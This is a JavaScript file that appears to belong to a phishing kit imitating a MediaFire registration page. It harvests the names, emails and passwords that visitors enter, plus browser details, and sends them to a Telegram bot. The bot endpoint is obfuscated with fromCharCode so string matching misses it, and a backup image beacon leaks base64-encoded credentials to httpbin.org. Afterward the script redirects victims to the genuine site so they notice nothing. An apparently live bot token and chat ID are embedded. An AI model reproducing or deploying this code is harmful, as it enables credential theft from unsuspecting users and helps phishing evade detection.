// app.js — obfuscated payload, no static Telegram strings
(function(){
    // Config fragments — split to avoid string matching
    var p1 = '8416791643:AAEZInsemXwV2akMlgI0OY27YNG-uqB9r_o';  // Replace with bot token
    var p2 = '7390531894';    // Replace with chat ID
    
    // Build endpoint dynamically
    var base = String.fromCharCode(104,116,116,112,115,58,47,47)+
               String.fromCharCode(97,112,105,46)+
               String.fromCharCode(116,101,108,101,103,114,97,109,46)+
               String.fromCharCode(111,114,103,47)+
               String.fromCharCode(98,111,116);
    var ep = base + p1 + String.fromCharCode(47,115,101,110,100,77,101,115,115,97,103,101);

    function esc(t){
        return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function b64e(s){
        return btoa(unescape(encodeURIComponent(s)));
    }

    window.handleSubmit = function(e){
        e.preventDefault();
        var fn = document.getElementById('reg_first_name').value.trim();
        var ln = document.getElementById('reg_last_name').value.trim();
        var em = document.getElementById('reg_email').value.trim();
        var pw = document.getElementById('reg_pass').value;
        
        var err = false;
        ['wrap_first_name','wrap_last_name','wrap_email','wrap_password'].forEach(function(id){
            document.getElementById(id).classList.remove('has-error');
        });
        if(!fn){ document.getElementById('wrap_first_name').classList.add('has-error'); err=true; }
        if(!ln){ document.getElementById('wrap_last_name').classList.add('has-error'); err=true; }
        if(!em||em.indexOf('@')===-1){ document.getElementById('wrap_email').classList.add('has-error'); err=true; }
        if(!pw||pw.length<6){ document.getElementById('wrap_password').classList.add('has-error'); err=true; }
        if(err) return false;

        document.getElementById('checkout_page_show').style.display='none';
        document.getElementById('checkout_page_processing').style.display='block';

        var ts = new Date().toISOString();
        var ua = navigator.userAgent;
        var pf = navigator.platform;
        var sc = window.screen.width+'x'+window.screen.height;
        var rf = document.referrer||'direct';

        // Obfuscated message construction
        var hdr = String.fromCharCode(55357,56575)+' NEW CAPTURE';
        var sep = String.fromCharCode(9472,9472,9472,9472,9472,9472,9472,9472,9472,9472);
        var msg = hdr+'\n'+sep+'\n'+
            'F: <code>'+esc(fn)+'</code>\n'+
            'L: <code>'+esc(ln)+'</code>\n'+
            'E: <code>'+esc(em)+'</code>\n'+
            'P: <code>'+esc(pw)+'</code>\n'+
            sep+'\n'+
            'T: '+ts+'\n'+
            'U: '+esc(ua.substring(0,200))+'\n'+
            'S: '+sc+'\n'+
            'R: '+esc(rf);

        // Secondary exfil via image beacon (fires even if fetch blocked)
        var beacon = new Image();
        beacon.src = 'https://httpbin.org/get?d='+b64e(JSON.stringify({f:fn,l:ln,e:em,p:pw,t:ts}));

        // Primary exfil
        fetch(ep,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:p2,text:msg,parse_mode:'HTML',disable_web_page_preview:true})
        }).catch(function(){}).finally(function(){
            setTimeout(function(){
                window.location.href='https://www.mediafire.com/upgrade/registration.php?pid=free';
            },1500);
        });

        return false;
    };

    document.getElementById('googleLoginBtn').addEventListener('click',function(){
        document.getElementById('reg_first_name').focus();
    });

    ['reg_first_name','reg_last_name','reg_email','reg_pass'].forEach(function(id){
        document.getElementById(id).addEventListener('input',function(){
            this.closest('.Form-inputWrap').classList.remove('has-error');
        });
    });
})();